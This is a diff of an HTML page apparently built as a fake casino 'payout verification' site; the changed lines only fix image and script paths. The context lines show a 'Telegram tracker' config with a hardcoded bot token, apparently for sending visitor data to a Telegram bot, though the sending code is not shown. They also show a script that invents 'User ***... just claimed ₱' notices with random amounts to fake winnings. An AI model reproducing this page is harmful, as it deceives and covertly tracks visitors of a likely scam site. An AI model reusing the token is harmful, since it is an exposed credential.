@@ -120,11 +120,11 @@
             
             <p style="font-size: 10px; color: #64748b; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px;">Secure Payout Verification System</p>
             
-            <img src="https://xjiligames.github.io/rewards/casinoplus.jpeg" class="promo-photo">
+            <img src="https://xjiligames.github.io/rewards/images/images/casinoplus.jpeg" class="promo-photo">
         </div>
     </div>
 
-    <script src="config.js"></script>
+    <script src="js/config.js"></script>
     <script>
         // --- TELEGRAM TRACKER CONFIG ---
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
@@ -203,7 +203,7 @@
             const randomAmount = [300, 500, 800, 1000][Math.floor(Math.random() * 4)];
             
             const wEntry = document.getElementById('winnerEntry');
-            if(wEntry) wEntry.innerHTML = `User ${randomPrefix}***${randomSuffix} just claimed <img src="gc_icon.png" class="gc-mini-icon">₱${randomAmount.toLocaleString()}`;
+            if(wEntry) wEntry.innerHTML = `User ${randomPrefix}***${randomSuffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${randomAmount.toLocaleString()}`;
         }
         setInterval(updateStats, 3000);
 
